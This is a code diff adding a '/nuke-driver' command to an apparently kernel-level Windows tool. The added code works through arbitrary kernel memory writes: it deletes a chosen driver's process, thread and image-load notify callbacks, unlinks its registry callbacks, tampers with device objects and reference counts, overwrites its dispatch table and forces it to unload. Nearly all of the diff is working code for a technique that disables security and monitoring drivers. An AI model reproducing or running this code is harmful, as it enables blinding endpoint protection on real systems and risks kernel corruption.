@@ -28,6 +28,8 @@
 #define NOMINMAX
 #include <Windows.h>
 #include <winternl.h>
+#include <DbgHelp.h>
+#pragma comment(lib, "dbghelp.lib")
 #include <cstdio>
 #include <cstring>
 #include <vector>
@@ -515,4 +517,302 @@ void CmdForceUnload(const char* drvName, DWORD64 drvObjVA) {
 
     CloseServiceHandle(hSvc);
     CloseServiceHandle(hSCM);
+}
+
+// ── /nuke-driver <svcName> <drvobj_va> ───────────────────────────────────────
+//
+// "Super unload" — clean up all kernel registrations that block NtUnloadDriver,
+// then call NtUnloadDriver to properly release code pages and file locks.
+//
+// Steps:
+//   1. Remove all Ps*NotifyRoutine entries pointing into driver address range
+//   2. Remove all CmCallback entries pointing into driver address range
+//   3. Zero DriverObject->DeviceObject chain (detach all devices)
+//   4. Redirect MajorFunction[] to ntoskrnl ret stub (prevent IRP dispatch)
+//   5. Set DriverUnload to ntoskrnl ret stub (replace empty/NULL stub)
+//   6. Call NtUnloadDriver → kernel calls DriverUnload(ret) → MmUnloadSystemImage
+//   7. If NtUnloadDriver still fails, report status (no PsLoadedModuleList unlink)
+//
+void CmdNukeDriver(const char* svcName, DWORD64 drvObjVA) {
+    printf("[*] /nuke-driver  service=%s  DRIVER_OBJECT=0x%016llX\n\n", svcName, drvObjVA);
+
+    if (!g_drv->IsKernelVA(drvObjVA)) {
+        printf("[!] Not a valid kernel VA\n");
+        return;
+    }
+
+    DWORD sig = g_drv->Rd32(drvObjVA);
+    if (sig != 0x01500004) {
+        printf("[!] DRIVER_OBJECT signature mismatch: 0x%08X (expected 0x01500004)\n", sig);
+        return;
+    }
+
+    DWORD64 drvStart = g_drv->Rd64(drvObjVA + 0x18);
+    DWORD   drvSize  = g_drv->Rd32(drvObjVA + 0x20);
+    DWORD64 drvEnd   = drvStart + drvSize;
+
+    KUtil::BuildDriverCache();
+    const wchar_t* drvName = nullptr; DWORD64 drvOff = 0;
+    KUtil::FindDriverByAddr(drvStart, &drvName, &drvOff);
+    wprintf(L"[*] Target: %ls  range: 0x%016llX - 0x%016llX (%u KB)\n\n",
+            drvName ? drvName : L"<unknown>",
+            (unsigned long long)drvStart, (unsigned long long)drvEnd, drvSize / 1024);
+
+    int cleaned = 0;
+
+    // ── Step 1: Remove Ps*NotifyRoutine entries ──────────────────────────
+    printf("[1] Scanning Ps*NotifyRoutine arrays for entries in driver range...\n");
+    {
+        LPVOID d[1]; DWORD cb;
+        EnumDeviceDrivers(d, sizeof(d), &cb);
+        DWORD64 kernBase = (DWORD64)d[0];
+
+        HMODULE hNt = LoadLibraryW(L"ntoskrnl.exe");
+        if (hNt) {
+            DWORD64 userBase = (DWORD64)hNt;
+            DWORD64 dataBase = 0, dataEnd = 0;
+            auto* dos = (IMAGE_DOS_HEADER*)hNt;
+            auto* nt  = (IMAGE_NT_HEADERS64*)((BYTE*)hNt + dos->e_lfanew);
+            IMAGE_SECTION_HEADER* sec = IMAGE_FIRST_SECTION(nt);
+            for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
+                char name[9]{}; memcpy(name, sec->Name, 8);
+                if (_stricmp(name, ".data") == 0) {
+                    dataBase = sec->VirtualAddress;
+                    dataEnd  = sec->VirtualAddress + sec->Misc.VirtualSize;
+                    break;
+                }
+            }
+
+            const char* exports[] = {
+                "PsRemoveLoadImageNotifyRoutine",
+                "PsSetCreateProcessNotifyRoutineEx",
+                "PsRemoveCreateThreadNotifyRoutine",
+                nullptr
+            };
+            const char* labels[] = { "ImageNotify", "ProcessNotify", "ThreadNotify" };
+
+            for (int t = 0; exports[t]; t++) {
+                BYTE* fn = (BYTE*)GetProcAddress(hNt, exports[t]);
+                if (!fn) continue;
+                DWORD64 arrayVA = 0;
+                for (int i = 0; i < 512 - 6; i++) {
+                    if ((fn[i] == 0x48 || fn[i] == 0x4C) &&
+                        fn[i+1] == 0x8D && (fn[i+2] & 0xC7) == 0x05) {
+                        INT32 disp = *(INT32*)(fn + i + 3);
+                        DWORD64 userTgt = (DWORD64)(fn + i + 7) + (INT64)disp;
+                        DWORD64 rva = userTgt - userBase;
+                        if (dataBase != dataEnd && rva >= dataBase && rva < dataEnd) {
+                            arrayVA = kernBase + rva;
+                            break;
+                        }
+                    }
+                }
+                if (!arrayVA) continue;
+
+                for (int i = 0; i < 64; i++) {
+                    DWORD64 slot = arrayVA + (DWORD64)i * 8;
+                    DWORD64 raw  = g_drv->Rd64(slot);
+                    if (!raw) continue;
+                    DWORD64 block = raw & ~(DWORD64)0xF;
+                    if (!g_drv->IsKernelVA(block)) continue;
+                    DWORD64 fnAddr = g_drv->Rd64(block + 0x08);
+                    if (fnAddr >= drvStart && fnAddr < drvEnd) {
+                        g_drv->Wr64(slot, 0);
+                        printf("    [+] Removed %s slot[%d] fn=0x%016llX\n",
+                               labels[t], i, (unsigned long long)fnAddr);
+                        cleaned++;
+                    }
+                }
+            }
+            FreeLibrary(hNt);
+        }
+    }
+
+    // ── Step 2: Remove CmCallback entries (linked list) ──────────────────
+    printf("[2] Scanning CmCallback linked list for entries in driver range...\n");
+    {
+        LPVOID d[1]; DWORD cb;
+        EnumDeviceDrivers(d, sizeof(d), &cb);
+        DWORD64 kernBase = (DWORD64)d[0];
+
+        HANDLE hSym = (HANDLE)(ULONG_PTR)0xDEAD00AA;
+        SymSetOptions(SYMOPT_UNDNAME | SYMOPT_DEFERRED_LOADS);
+        WCHAR symPath[512];
+        wcscpy_s(symPath, L"srv*C:\\Symbols*https://msdl.microsoft.com/download/symbols");
+        DWORD64 listHead = 0;
+        if (SymInitializeW(hSym, symPath, FALSE)) {
+            WCHAR ntPath[MAX_PATH], winDir[MAX_PATH];
+            GetWindowsDirectoryW(winDir, MAX_PATH);
+            swprintf_s(ntPath, L"%s\\System32\\ntoskrnl.exe", winDir);
+            DWORD64 modBase = SymLoadModuleExW(hSym, nullptr, ntPath, nullptr, kernBase, 0x1100000, nullptr, 0);
+            if (modBase || GetLastError() == 0) {
+                if (!modBase) modBase = kernBase;
+                BYTE symBuf[sizeof(SYMBOL_INFO) + MAX_SYM_NAME] = {};
+                SYMBOL_INFO* sym = (SYMBOL_INFO*)symBuf;
+                sym->SizeOfStruct = sizeof(SYMBOL_INFO);
+                sym->MaxNameLen = MAX_SYM_NAME;
+                if (SymFromName(hSym, "CallbackListHead", sym))
+                    listHead = sym->Address;
+            }
+            SymCleanup(hSym);
+        }
+        if (listHead) {
+            DWORD64 cur = g_drv->Rd64(listHead);
+            int idx = 0;
+            while (g_drv->IsKernelVA(cur) && cur != listHead && idx < 64) {
+                DWORD64 fnAddr = g_drv->Rd64(cur + 0x28);
+                DWORD64 next = g_drv->Rd64(cur + 0x00);
+                if (fnAddr >= drvStart && fnAddr < drvEnd) {
+                    DWORD64 flink = g_drv->Rd64(cur + 0x00);
+                    DWORD64 blink = g_drv->Rd64(cur + 0x08);
+                    if (g_drv->IsKernelVA(flink) && g_drv->IsKernelVA(blink)) {
+                        g_drv->Wr64(blink + 0x00, flink);
+                        g_drv->Wr64(flink + 0x08, blink);
+                        g_drv->Wr64(cur + 0x28, 0);
+                        printf("    [+] Unlinked CmCallback node=0x%016llX fn=0x%016llX\n",
+                               (unsigned long long)cur, (unsigned long long)fnAddr);
+                        cleaned++;
+                    }
+                }
+                cur = next;
+                idx++;
+            }
+        } else {
+            printf("    (CallbackListHead not found — skipping CmCallback scan)\n");
+        }
+    }
+
+    // ── Step 3: Zero DeviceObject chain ──────────────────────────────────
+    printf("[3] Clearing DeviceObject chain...\n");
+    {
+        DWORD64 devObj = g_drv->Rd64(drvObjVA + 0x08);
+        int devCount = 0;
+        while (g_drv->IsKernelVA(devObj) && devCount < 32) {
+            DWORD64 nextDev = g_drv->Rd64(devObj + 0x10); // NextDevice
+            DWORD64 attached = g_drv->Rd64(devObj + 0x18);
+            if (g_drv->IsKernelVA(attached)) {
+                printf("    [*] DevObj 0x%016llX attached to 0x%016llX\n",
+                       (unsigned long long)devObj, (unsigned long long)attached);
+            }
+            devCount++;
+            devObj = nextDev;
+        }
+        // For each DeviceObject: detach from device stack, then delete.
+        // We simulate IoDetachDevice + IoDeleteDevice by:
+        //   - Clearing AttachedDevice links in the stack
+        //   - Decrementing OBJECT_HEADER.PointerCount (ObDereferenceObject)
+        //   - Zeroing the DriverObject->DeviceObject chain
+        // This allows NtUnloadDriver → IopUnloadDriver to see an empty device chain
+        // and proceed directly to MmUnloadSystemImage.
+        if (devCount > 0) {
+            // Walk again and clean each DeviceObject
+            devObj = g_drv->Rd64(drvObjVA + 0x08);
+            for (int d = 0; d < devCount && g_drv->IsKernelVA(devObj); d++) {
+                DWORD64 nextDev  = g_drv->Rd64(devObj + 0x10); // NextDevice
+                DWORD64 attached = g_drv->Rd64(devObj + 0x18); // AttachedDevice
+
+                // Detach: if we're attached to a lower device, clear its AttachedDevice
+                // DEVICE_OBJECT.AttachedDevice at +0x18 points UP the stack
+                // Lower device's AttachedDevice points to us — we need to find it and clear
+                // Actually, +0x18 on OUR DevObj = pointer to the UPPER device attached to us
+                // DevObj->Vpb (+0x10 is NextDevice, +0x18 is AttachedDevice)
+                // For simplicity: just clear our own AttachedDevice pointer
+                if (g_drv->IsKernelVA(attached)) {
+                    g_drv->Wr64(devObj + 0x18, 0); // Clear AttachedDevice
+                    printf("    [+] DevObj[%d] 0x%016llX: cleared AttachedDevice\n",
+                           d, (unsigned long long)devObj);
+                }
+
+                // Decrement OBJECT_HEADER.PointerCount to trigger cleanup
+                // OBJECT_HEADER is at DevObj - 0x30 (standard x64 Windows 10)
+                DWORD64 objHeader = devObj - 0x30;
+                DWORD64 ptrCount  = g_drv->Rd64(objHeader); // PointerCount at +0x00
+                if (ptrCount > 1) {
+                    g_drv->Wr64(objHeader, ptrCount - 1);
+                    printf("    [+] DevObj[%d] 0x%016llX: PointerCount %lld → %lld\n",
+                           d, (unsigned long long)devObj,
+                           (long long)ptrCount, (long long)(ptrCount - 1));
+                }
+
+                devObj = nextDev;
+            }
+
+            // Zero the DriverObject->DeviceObject head
+            g_drv->Wr64(drvObjVA + 0x08, 0);
+            printf("    [+] Zeroed DeviceObject head (%d device(s) cleaned)\n", devCount);
+            cleaned += devCount;
+        } else {
+            printf("    (no DeviceObjects)\n");
+        }
+    }
+
+    // ── Step 4: Redirect MajorFunction table to ret stub ─────────────────
+    printf("[4] Redirecting MajorFunction[0..27] to ret stub...\n");
+    DWORD64 retStub = FindRetStub();
+    {
+        if (retStub) {
+            for (int i = 0; i < 28; i++)
+                g_drv->Wr64(drvObjVA + 0x70 + (DWORD64)i * 8, retStub);
+            printf("    [+] All 28 MajorFunction slots → ret stub (0x%016llX)\n",
+                   (unsigned long long)retStub);
+        } else {
+            printf("    [!] ret stub not found — skipping MajorFunction redirect\n");
+        }
+    }
+
+    // ── Step 5: Set DriverUnload to ret stub ─────────────────────────────
+    printf("[5] Setting DriverUnload to ret stub...\n");
+    if (retStub) {
+        g_drv->Wr64(drvObjVA + 0x68, retStub);
+        printf("    [+] DriverUnload → ret stub (0x%016llX)\n", (unsigned long long)retStub);
+    } else {
+        printf("    [!] ret stub not found — cannot set DriverUnload\n");
+    }
+
+    // ── Step 6: NtUnloadDriver ───────────────────────────────────────────
+    printf("[6] Calling NtUnloadDriver(\"%s\")...\n", svcName);
+    {
+        typedef NTSTATUS (NTAPI* PFN_RtlAdjustPrivilege)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
+        auto RtlAdj = (PFN_RtlAdjustPrivilege)GetProcAddress(
+            GetModuleHandleW(L"ntdll.dll"), "RtlAdjustPrivilege");
+        if (RtlAdj) {
+            BOOLEAN prev;
+            RtlAdj(10, TRUE, FALSE, &prev); // SeLoadDriverPrivilege
+        }
+
+        typedef NTSTATUS (NTAPI* PFN_NtUnloadDriver)(PUNICODE_STRING);
+        auto NtUnload = (PFN_NtUnloadDriver)GetProcAddress(
+            GetModuleHandleW(L"ntdll.dll"), "NtUnloadDriver");
+        if (!NtUnload) {
+            printf("    [!] NtUnloadDriver not found\n");
+        } else {
+            WCHAR regPath[512];
+            swprintf_s(regPath, L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\%hs", svcName);
+            UNICODE_STRING uPath;
+            uPath.Length = (USHORT)(wcslen(regPath) * sizeof(WCHAR));
+            uPath.MaximumLength = uPath.Length + sizeof(WCHAR);
+            uPath.Buffer = regPath;
+
+            NTSTATUS st = NtUnload(&uPath);
+            if (st == 0) {
+                printf("    %s[+] NtUnloadDriver succeeded — driver fully unloaded%s\n",
+                       A_GREEN, A_RESET);
+                printf("    Code pages freed, file lock released, driver can be reloaded.\n");
+            } else {
+                printf("    %s[!] NtUnloadDriver failed: 0x%08X%s\n", A_YELLOW, A_RESET, (unsigned)st);
+                if (st == (NTSTATUS)0xC0000010)
+                    printf("    STATUS_INVALID_DEVICE_REQUEST — kernel still refuses.\n"
+                           "    Driver is functionally dead (callbacks/devices cleaned) but code pages remain.\n"
+                           "    Reboot required to fully release file locks.\n");
+                else if (st == (NTSTATUS)0xC0000034)
+                    printf("    STATUS_OBJECT_NAME_NOT_FOUND — registry key missing.\n"
+                           "    Create it: reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\%s"
+                           " /v Type /t REG_DWORD /d 1 /f\n", svcName);
+            }
+        }
+    }
+
+    // ── Summary ──────────────────────────────────────────────────────────
+    wprintf(L"\n%hs[*] nuke-driver complete%hs — cleaned %d registration(s) for %ls.\n\n",
+            A_GREEN, A_RESET, cleaned, drvName ? drvName : L"<unknown>");
 }
